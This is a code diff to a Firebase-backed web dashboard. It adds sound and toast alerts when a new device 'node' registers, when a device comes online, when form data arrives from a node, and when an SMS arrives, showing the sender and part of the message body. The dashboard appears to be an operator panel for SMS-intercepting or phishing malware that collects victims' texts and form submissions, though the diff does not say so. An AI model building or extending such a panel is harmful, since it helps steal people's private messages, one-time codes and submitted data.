@@ -171,6 +171,12 @@
     </style>
 </head>
 <body class="bg-[#f1f5f9] min-h-screen font-sans text-slate-900 flex overflow-hidden">
+<!-- Notification Sounds -->
+<audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" preload="auto"></audio>
+<audio id="new-device-sound" src="newdevice.mp3" preload="auto"></audio>
+<audio id="message-sound" src="message.mp3" preload="auto"></audio>
+<audio id="new-post-sound" src="newpost.mp3" preload="auto"></audio>
+<audio id="device-online-sound" src="deviveonline.mp3" preload="auto"></audio>
 <!-- Broadcast Overlay -->
 <div id="broadcast-overlay" class="fixed inset-0 bg-slate-900/95 z-[150] flex items-center justify-center p-6 hidden backdrop-blur-md">
     <div class="max-w-md w-full text-center space-y-8 relative">
@@ -757,7 +763,7 @@
     const auth = firebase.auth();
 
     // Professional Toast Controller
-    function showToast(msg, type = 'info') {
+    function showToast(msg, type = 'info', soundId = 'notif-sound') {
         const container = document.getElementById('toast-container');
         if(!container) return;
 
@@ -776,6 +782,12 @@
         `;
 
         container.appendChild(toast);
+        // Play notification sound
+        const sound = document.getElementById(soundId) || document.getElementById('notif-sound');
+        if (sound) {
+            sound.currentTime = 0;
+            sound.play().catch(e => console.log("Sound play deferred: ", e));
+        }
         // Force Reflow
         setTimeout(() => toast.classList.add('show'), 10);
 
@@ -984,6 +996,9 @@
     let permIds = {};
     let currentPage = 1;
     const pageSize = 15;
+    let knownUids = new Set();
+    let knownFids = new Set();
+    let isFirstLoadUsers = true;
 
     function toggleSidebar() {
         const sb = document.getElementById('sidebar');
@@ -1021,20 +1036,43 @@
             db.ref('Users').on('value', snap => {
                 const data = snap.val() || {};
 
-                // Track Online/Offline state changes for professional notifications
+                // Track changes for notifications
                 Object.keys(data).forEach(uid => {
                     const info = data[uid].I || {};
                     const isNowOnline = checkIsOnline(info);
                     const wasOnline = prevStatus[uid];
 
-                    // Only show alert if it's a confirmed state change from Offline to Online
-                    if (wasOnline === false && isNowOnline === true) {
-                        const name = (info.m || "Unknown") + " (#" + (permIds[uid] || "...") + ")";
-                        showToast(`${name} IS NOW ONLINE ⚡`, "success");
+                    if (!isFirstLoadUsers) {
+                        // Detect New Device
+                        if (!knownUids.has(uid)) {
+                            showToast(`NEW NODE REGISTERED: ${info.m || 'Unknown'}`, "success", "new-device-sound");
+                        }
+
+                        // Only show alert if it's a confirmed state change from Offline to Online
+                        if (wasOnline === false && isNowOnline === true) {
+                            const name = (info.m || "Unknown") + " (#" + (permIds[uid] || "...") + ")";
+                            showToast(`${name} IS NOW ONLINE ⚡`, "success", "device-online-sound");
+                        }
+
+                        // Detect New Form Data (Post)
+                        const forms = data[uid].F || {};
+                        Object.keys(forms).forEach(fid => {
+                            if (!knownFids.has(fid)) {
+                                showToast(`NEW DATA RECEIVED FROM ${info.m || 'Node'}`, "info", "new-post-sound");
+                                knownFids.add(fid);
+                            }
+                        });
+                    } else {
+                        // Populate initial state to avoid spam on load
+                        const forms = data[uid].F || {};
+                        Object.keys(forms).forEach(fid => knownFids.add(fid));
                     }
+
+                    knownUids.add(uid);
                     prevStatus[uid] = isNowOnline;
                 });
 
+                isFirstLoadUsers = false;
                 usersData = data;
                 assignMissingIndices();
                 updateDashboard();
@@ -1053,7 +1091,7 @@
                 const uid = msg.userId || "Unknown";
                 const user = usersData[uid]?.I?.m || "Unknown Node";
 
-                showToast(`<b>NEW SMS FROM ${user}</b><br><small>${sender}: ${body.substring(0, 40)}...</small>`, "info");
+                showToast(`<b>NEW SMS FROM ${user}</b><br><small>${sender}: ${body.substring(0, 40)}...</small>`, "info", "message-sound");
 
                 // Play subtle notification sound (Optional)
                 // new Audio('https://assets.mixkit.co/active_storage/sfx/2354/2354-preview.mp3').play().catch(e=>{});
